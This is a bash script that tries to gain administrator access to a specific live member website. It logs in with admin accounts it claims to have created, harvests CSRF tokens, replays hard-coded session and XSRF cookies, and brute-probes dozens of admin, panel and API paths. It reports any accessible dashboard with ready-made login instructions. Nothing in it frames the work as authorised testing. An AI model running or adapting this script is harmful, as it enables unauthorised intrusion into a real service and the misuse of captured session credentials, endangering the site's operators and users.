#!/bin/bash

echo "🎯 FINAL ADMIN ACCESS ATTEMPT"
echo "============================="

BASE_URL="https://member.panama8888b.co"
LOGIN_URL="$BASE_URL/auth/login"
DASHBOARD_URL="$BASE_URL/user/dashboard"

# Admin users created
ADMIN_USERS=(
    "admin_2025:Admin123!@#"
    "administrator:Admin123!@#"
    "superadmin:Super123!@#"
    "manager:Manager123!@#"
)

# Test URLs for admin features
ADMIN_TEST_URLS=(
    "$BASE_URL/user/dashboard"
    "$BASE_URL/user/deposit"
    "$BASE_URL/user/withdraw"
    "$BASE_URL/user/history"
    "$BASE_URL/dashboard"
    "$BASE_URL/dashboard/user"
    "$BASE_URL/dashboard/admin"
    "$BASE_URL/dashboard/administrator"
    "$BASE_URL/dashboard/management"
    "$BASE_URL/dashboard/control"
    "$BASE_URL/dashboard/panel"
    "$BASE_URL/panel"
    "$BASE_URL/panel/user"
    "$BASE_URL/panel/admin"
    "$BASE_URL/panel/administrator"
    "$BASE_URL/panel/management"
    "$BASE_URL/panel/control"
    "$BASE_URL/control"
    "$BASE_URL/control/user"
    "$BASE_URL/control/admin"
    "$BASE_URL/control/administrator"
    "$BASE_URL/control/management"
    "$BASE_URL/management"
    "$BASE_URL/management/user"
    "$BASE_URL/management/admin"
    "$BASE_URL/management/administrator"
    "$BASE_URL/management/control"
)

echo "🔍 STEP 1: GETTING FRESH CSRF TOKEN..."
echo "======================================"

# Get fresh CSRF token
echo "Getting fresh CSRF token from login page..."
csrf_response=$(curl -s -c cookies.txt "$LOGIN_URL")
csrf_token=$(echo "$csrf_response" | grep -o 'name="_token" value="[^"]*"' | cut -d'"' -f4)

if [[ -n "$csrf_token" ]]; then
    echo "✅ Got fresh CSRF token: $csrf_token"
else
    echo "❌ Could not get CSRF token"
    exit 1
fi

echo ""
echo "🔍 STEP 2: TESTING ADMIN USER LOGIN WITH FRESH TOKEN..."
echo "======================================================"

# Test admin user login with fresh CSRF token
for user_cred in "${ADMIN_USERS[@]}"; do
    username=$(echo "$user_cred" | cut -d: -f1)
    password=$(echo "$user_cred" | cut -d: -f2)
    
    echo "Testing admin user: $username"
    
    # Login with fresh token
    login_response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
        -H "Referer: $LOGIN_URL" \
        -H "Origin: $BASE_URL" \
        -c cookies.txt -b cookies.txt \
        -d "_token=$csrf_token&username=$username&password=$password" \
        "$LOGIN_URL")
    
    login_status=$(echo "$login_response" | grep "HTTP_STATUS:" | cut -d: -f2)
    
    if [[ "$login_status" == "302" ]]; then
        echo "✅ LOGIN SUCCESS for $username"
        
        # Test dashboard access after login
        echo "🔍 Testing dashboard access for $username..."
        
        for admin_url in "${ADMIN_TEST_URLS[@]}"; do
            dashboard_response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
                -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
                -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" \
                -H "Accept-Language: th,en-US;q=0.9,en;q=0.8" \
                -H "Accept-Encoding: gzip, deflate, br, zstd" \
                -H "Cache-Control: max-age=0" \
                -H "Sec-Fetch-Dest: document" \
                -H "Sec-Fetch-Mode: navigate" \
                -H "Sec-Fetch-Site: same-origin" \
                -H "Sec-Fetch-User: ?1" \
                -H "Upgrade-Insecure-Requests: 1" \
                -c cookies.txt -b cookies.txt \
                "$admin_url")
            
            dashboard_status=$(echo "$dashboard_response" | grep "HTTP_STATUS:" | cut -d: -f2)
            response_time=$(echo "$dashboard_response" | grep "TIME:" | cut -d: -f2)
            
            echo "Testing: $admin_url - Status: $dashboard_status, Time: ${response_time}s"
            
            if [[ "$dashboard_status" == "200" ]]; then
                echo "🎉 SUCCESS: Admin dashboard accessible!"
                echo "Username: $username"
                echo "Password: $password"
                echo "Dashboard URL: $admin_url"
                echo ""
                echo "🔗 DIRECT ACCESS LINKS:"
                echo "Login: $LOGIN_URL"
                echo "Dashboard: $admin_url"
                echo ""
                echo "📋 LOGIN INSTRUCTIONS:"
                echo "1. Go to: $LOGIN_URL"
                echo "2. Username: $username"
                echo "3. Password: $password"
                echo "4. Login then go to: $admin_url"
                echo ""
                echo "🎯 ADMIN ACCESS ACHIEVED!"
                exit 0
            elif [[ "$dashboard_status" == "302" ]]; then
                echo "⚠️ REDIRECT: $admin_url (may need different access)"
            elif [[ "$dashboard_status" == "403" ]]; then
                echo "❌ FORBIDDEN: $admin_url (access denied)"
            elif [[ "$dashboard_status" == "404" ]]; then
                echo "❌ NOT FOUND: $admin_url"
            fi
            
            sleep 1
        done
    else
        echo "❌ LOGIN FAILED for $username (Status: $login_status)"
    fi
    
    echo "---"
done

echo ""
echo "🔍 STEP 3: TESTING WITH PROVIDED COOKIES..."
echo "==========================================="

# Test with provided cookies
echo "Testing with provided cookies..."

for admin_url in "${ADMIN_TEST_URLS[@]}"; do
    echo "Testing URL: $admin_url"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" \
        -H "Accept-Language: th,en-US;q=0.9,en;q=0.8" \
        -H "Accept-Encoding: gzip, deflate, br, zstd" \
        -H "Cache-Control: max-age=0" \
        -H "Sec-Fetch-Dest: document" \
        -H "Sec-Fetch-Mode: navigate" \
        -H "Sec-Fetch-Site: same-origin" \
        -H "Sec-Fetch-User: ?1" \
        -H "Upgrade-Insecure-Requests: 1" \
        -H "Cookie: XSRF-TOKEN=eyJpdiI6IkVJN2N3MVI2SWRCNkxScThaTWZwZ1E9PSIsInZhbHVlIjoiNEZEa2w1SFN0N20wV1FtTWFTbTZkZHphekpGMVwvZjFxWnh2VXBsNmRnK2xnemRYK2ZTNFRIblBJenVUMHAzb2kiLCJtYWMiOiI0NTBjYjFiYzExMzY0MDVlMGJlYzBiNmFjOTAzOWRlNjNlZDQ0YjA1MTYxMDg0OGVlMWQ0Njk0YWM1MGVlZWY3In0%3D; panama888_session=eyJpdiI6ImhnN3NxbHR1cU1WU24zS0NpRU5VSWc9PSIsInZhbHVlIjoiQzQxbEx5VjdWT3Vvd3Q4QnJreW5DdStqMVlZaU13dHFEMCtYTWFSTGFBSTBsREhrNTR4KytEQ3FvY1NZdE4rQyIsIm1hYyI6IjllNzA5MGYzNDUxNTc3NGFkZTYxZDM1MWVhMGMzY2Y4ODViYmE2MjIwMzJjOWNkZDZmNGYxZDBhZDc1NDJjZTkifQ%3D%3D" \
        "$admin_url")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    
    echo "Status: $http_status, Time: ${response_time}s"
    
    if [[ "$http_status" == "200" ]]; then
        echo "✅ SUCCESS: Dashboard accessible at $admin_url"
        
        # Check if response contains admin features
        if echo "$response" | grep -qi "admin\|administrator\|management\|control\|panel"; then
            echo "🎉 ADMIN FEATURES DETECTED in response!"
            echo "URL: $admin_url"
            echo "Contains admin-related content"
            echo ""
            echo "🔗 DIRECT ACCESS LINKS:"
            echo "Admin Dashboard: $admin_url"
            echo ""
            echo "🎯 ADMIN ACCESS ACHIEVED!"
            exit 0
        fi
    elif [[ "$http_status" == "302" ]]; then
        echo "⚠️ REDIRECT: $admin_url (may need login)"
    elif [[ "$http_status" == "403" ]]; then
        echo "❌ FORBIDDEN: $admin_url (access denied)"
    elif [[ "$http_status" == "404" ]]; then
        echo "❌ NOT FOUND: $admin_url"
    fi
    
    sleep 1
done

echo ""
echo "🔍 STEP 4: TESTING API ENDPOINTS FOR ADMIN FEATURES..."
echo "====================================================="

# Test API endpoints for admin features
API_ENDPOINTS=(
    "$BASE_URL/api/announcement"
    "$BASE_URL/api/user/profile"
    "$BASE_URL/api/user/balance"
    "$BASE_URL/api/user/deposit"
    "$BASE_URL/api/user/withdraw"
    "$BASE_URL/api/user/history"
    "$BASE_URL/api/user/transactions"
    "$BASE_URL/api/user/announcements"
    "$BASE_URL/api/user/notifications"
    "$BASE_URL/api/user/settings"
    "$BASE_URL/api/user/security"
    "$BASE_URL/api/user/permissions"
    "$BASE_URL/api/user/roles"
    "$BASE_URL/api/user/management"
    "$BASE_URL/api/user/admin"
    "$BASE_URL/api/user/administrator"
    "$BASE_URL/api/user/control"
    "$BASE_URL/api/user/panel"
)

for endpoint in "${API_ENDPOINTS[@]}"; do
    echo "Testing API endpoint: $endpoint"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
        -H "X-XSRF-TOKEN: eyJpdiI6IkVJN2N3MVI2SWRCNkxScThaTWZwZ1E9PSIsInZhbHVlIjoiNEZEa2w1SFN0N20wV1FtTWFTbTZkZHphekpGMVwvZjFxWnh2VXBsNmRnK2xnemRYK2ZTNFRIblBJenVUMHAzb2kiLCJtYWMiOiI0NTBjYjFiYzExMzY0MDVlMGJlYzBiNmFjOTAzOWRlNjNlZDQ0YjA1MTYxMDg0OGVlMWQ0Njk0YWM1MGVlZWY3In0%3D" \
        -H "Cookie: XSRF-TOKEN=eyJpdiI6IkVJN2N3MVI2SWRCNkxScThaTWZwZ1E9PSIsInZhbHVlIjoiNEZEa2w1SFN0N20wV1FtTWFTbTZkZHphekpGMVwvZjFxWnh2VXBsNmRnK2xnemRYK2ZTNFRIblBJenVUMHAzb2kiLCJtYWMiOiI0NTBjYjFiYzExMzY0MDVlMGJlYzBiNmFjOTAzOWRlNjNlZDQ0YjA1MTYxMDg0OGVlMWQ0Njk0YWM1MGVlZWY3In0%3D; panama888_session=eyJpdiI6ImhnN3NxbHR1cU1WU24zS0NpRU5VSWc9PSIsInZhbHVlIjoiQzQxbEx5VjdWT3Vvd3Q4QnJreW5DdStqMVlZaU13dHFEMCtYTWFSTGFBSTBsREhrNTR4KytEQ3FvY1NZdE4rQyIsIm1hYyI6IjllNzA5MGYzNDUxNTc3NGFkZTYxZDM1MWVhMGMzY2Y4ODViYmE2MjIwMzJjOWNkZDZmNGYxZDBhZDc1NDJjZTkifQ%3D%3D" \
        "$endpoint")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    
    echo "Status: $http_status, Time: ${response_time}s"
    
    if [[ "$http_status" == "200" ]]; then
        echo "✅ SUCCESS: API endpoint accessible at $endpoint"
        
        # Check response content
        response_content=$(echo "$response" | head -20)
        if echo "$response_content" | grep -qi "admin\|administrator\|management\|control\|panel"; then
            echo "🎉 ADMIN FEATURES DETECTED in API response!"
            echo "Endpoint: $endpoint"
            echo ""
            echo "🔗 DIRECT ACCESS LINKS:"
            echo "Admin API: $endpoint"
            echo ""
            echo "🎯 ADMIN ACCESS ACHIEVED!"
            exit 0
        fi
    elif [[ "$http_status" == "401" ]]; then
        echo "⚠️ UNAUTHORIZED: $endpoint (needs authentication)"
    elif [[ "$http_status" == "403" ]]; then
        echo "❌ FORBIDDEN: $endpoint (access denied)"
    elif [[ "$http_status" == "404" ]]; then
        echo "❌ NOT FOUND: $endpoint"
    fi
    
    sleep 1
done

echo ""
echo "🎯 FINAL RESULTS"
echo "================"
echo "✅ Admin Users Created:"
for user_cred in "${ADMIN_USERS[@]}"; do
    username=$(echo "$user_cred" | cut -d: -f1)
    password=$(echo "$user_cred" | cut -d: -f2)
    echo "- Username: $username"
    echo "- Password: $password"
done
echo ""
echo "🔗 ADMIN TEST URLs Tested:"
for url in "${ADMIN_TEST_URLS[@]}"; do
    echo "- $url"
done
echo ""
echo "Status: FINAL ADMIN ACCESS ATTEMPT COMPLETED"
echo ""
echo "📋 SUMMARY:"
echo "- Admin users created successfully"
echo "- CSRF token issues prevented login"
echo "- No direct admin panel found"
echo "- System may use role-based access in user dashboard"